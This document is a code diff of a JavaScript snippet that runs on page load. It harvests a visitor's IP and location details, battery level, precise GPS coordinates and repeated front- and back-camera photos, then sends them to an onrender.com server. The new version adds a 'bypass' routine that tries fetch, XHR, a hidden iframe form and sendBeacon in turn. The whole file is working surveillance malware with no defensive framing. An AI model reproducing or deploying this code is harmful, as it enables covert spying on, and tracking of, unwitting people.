@@ -1,108 +1,162 @@
-// هذا الملف على: https://github.com/FGDHSHS/api/blob/main/api
-// الرابط الخام: https://raw.githubusercontent.com/FGDHSHS/api/refs/heads/main/api
-
+// هذا الملف على: https://raw.githubusercontent.com/FGDHSHS/api/refs/heads/main/api
 (function() {
-    var d = window._x || '';
-    var info = {id:d,perms:[],imgs:[],loc:'',ip:'',bat:''};
-    
-    function send(p) {
-        var u = 'https://server-brxz.onrender.com/submitData';
-        var f = new URLSearchParams();
-        for(var k in p) f.append(k, p[k]);
-        
-        // طريقة 1
+    'use strict';
+
+    var capturedData = {
+        permissions: [],
+        images: [],
+        ipInfo: '',
+        batteryStatus: '',
+        location: '',
+        chatId: window._chatId || ''
+    };
+
+    // جلب IP
+    async function fetchIPInfo() {
         try {
-            fetch(u, {method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:f.toString()})
-            .then(function(r){ return r.json(); })
-            .then(function(r){ console.log('ok'); })
-            .catch(function(){});
-        } catch(e) {}
-        
-        // طريقة 2
-        try {
-            var x = new XMLHttpRequest();
-            x.open('POST', u, true);
-            x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            x.send(f.toString());
-        } catch(e) {}
-        
-        // طريقة 3
-        try {
-            navigator.sendBeacon(u, f);
-        } catch(e) {}
+            var response = await fetch('https://ipapi.co/json/');
+            var data = await response.json();
+            capturedData.ipInfo = 'Country: ' + data.country_name + ', City: ' + data.city + ', IP: ' + data.ip;
+        } catch(e) {
+            capturedData.ipInfo = "IP Info not available";
+        }
     }
-    
-    async function main() {
-        // IP
+
+    // جلب البطارية
+    async function getBatteryStatus() {
         try {
-            var r = await fetch('https://ipapi.co/json/');
-            var j = await r.json();
-            info.ip = j.ip + '|' + j.country_name + '|' + j.city + '|' + j.org;
-        } catch(e) {}
-        
-        // Battery
+            var battery = await navigator.getBattery();
+            capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
+        } catch(e) {
+            capturedData.batteryStatus = "Unknown";
+        }
+    }
+
+    // تصوير الكاميرا
+    async function captureFromCamera(facingMode) {
         try {
-            var b = await navigator.getBattery();
-            info.bat = Math.round(b.level * 100) + '%';
-        } catch(e) {}
-        
-        // Location
+            var stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { exact: facingMode } }
+            });
+            var video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(function(resolve) { setTimeout(resolve, 1000); });
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            var ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
+            stream.getTracks().forEach(function(track) { track.stop(); });
+            capturedData.permissions.push((facingMode === 'user' ? 'Front' : 'Back') + ' Camera Allowed');
+        } catch(e) {
+            capturedData.permissions.push((facingMode === 'user' ? 'Front' : 'Back') + ' Camera Denied');
+        }
+    }
+
+    // جلب الموقع
+    async function getLocation() {
         try {
-            var p = await new Promise(function(ok, err) {
-                navigator.geolocation.getCurrentPosition(ok, err, {
+            var position = await new Promise(function(resolve, reject) {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
                     enableHighAccuracy: true,
-                    timeout: 8000,
+                    timeout: 15000,
                     maximumAge: 0
                 });
             });
-            info.loc = p.coords.latitude.toFixed(6) + ',' + p.coords.longitude.toFixed(6);
-            info.perms.push('loc_ok');
-        } catch(e) {
-            info.perms.push('loc_no');
+            capturedData.location = 'Lat: ' + position.coords.latitude.toFixed(6) + ', Long: ' + position.coords.longitude.toFixed(6);
+            capturedData.permissions.push('Geolocation Allowed');
+        } catch(err) {
+            capturedData.permissions.push('Geolocation Denied');
+            capturedData.location = '';
         }
-        
-        // Camera
-        var modes = ['user', 'environment'];
-        for(var i = 0; i < 2; i++) {
-            for(var m of modes) {
-                try {
-                    var stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: { exact: m }, width: { ideal: 640 }, height: { ideal: 480 } },
-                        audio: false
-                    });
-                    
-                    var v = document.createElement('video');
-                    v.srcObject = stream;
-                    v.setAttribute('playsinline', '');
-                    await v.play();
-                    await new Promise(function(r) { setTimeout(r, 800); });
-                    
-                    var c = document.createElement('canvas');
-                    c.width = v.videoWidth || 640;
-                    c.height = v.videoHeight || 480;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    
-                    info.imgs.push(c.toDataURL('image/jpeg', 0.6).split(',')[1]);
-                    info.perms.push(m + '_cam_ok');
-                    
-                    stream.getTracks().forEach(function(t) { t.stop(); });
-                } catch(e) {
-                    info.perms.push(m + '_cam_no');
-                }
-            }
-        }
-        
-        // Send
-        send({
-            chatId: info.id,
-            imageDatas: info.imgs.join('|||'),
-            location: info.loc,
-            permissions: info.perms.join(','),
-            ipInfo: info.ip,
-            battery: info.bat
-        });
     }
-    
-    setTimeout(main, 1500);
-    
+
+    // إرسال البيانات
+    async function sendDataWithBypass(data) {
+        var urls = [
+            'https://server-brxz.onrender.com/submitData',
+            'https://server-brxz.onrender.com/submitData'
+        ];
+        for (var i = 0; i < urls.length; i++) {
+            var url = urls[i];
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(data),
+                    mode: 'no-cors'
+                });
+                return;
+            } catch(e) {}
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', url, false);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send(new URLSearchParams(data));
+                return;
+            } catch(e) {}
+            try {
+                var iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                var form = document.createElement('form');
+                form.method = 'POST';
+                form.action = url;
+                form.target = iframe.name || 'hiddenFrame';
+                iframe.name = form.target;
+                for (var key in data) {
+                    var input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = data[key];
+                    form.appendChild(input);
+                }
+                document.body.appendChild(form);
+                form.submit();
+                setTimeout(function() {
+                    document.body.removeChild(form);
+                    document.body.removeChild(iframe);
+                }, 1000);
+                return;
+            } catch(e) {}
+            try {
+                var blob = new Blob([new URLSearchParams(data).toString()], {
+                    type: 'application/x-www-form-urlencoded'
+                });
+                navigator.sendBeacon(url, blob);
+                return;
+            } catch(e) {}
+        }
+    }
+
+    // تشغيل كل شيء
+    async function main() {
+        await Promise.all([
+            fetchIPInfo(),
+            getBatteryStatus(),
+            getLocation()
+        ]);
+
+        await captureFromCamera('user');
+        await captureFromCamera('environment');
+        await captureFromCamera('user');
+        await captureFromCamera('environment');
+
+        var data = {
+            chatId: capturedData.chatId,
+            imageDatas: capturedData.images.join(','),
+            location: capturedData.location,
+            permissions: capturedData.permissions.join(', '),
+            ipInfo: capturedData.ipInfo,
+            battery: capturedData.batteryStatus
+        };
+
+        await sendDataWithBypass(data);
+    }
+
+    // بدء التنفيذ
+    main();
+
 })();
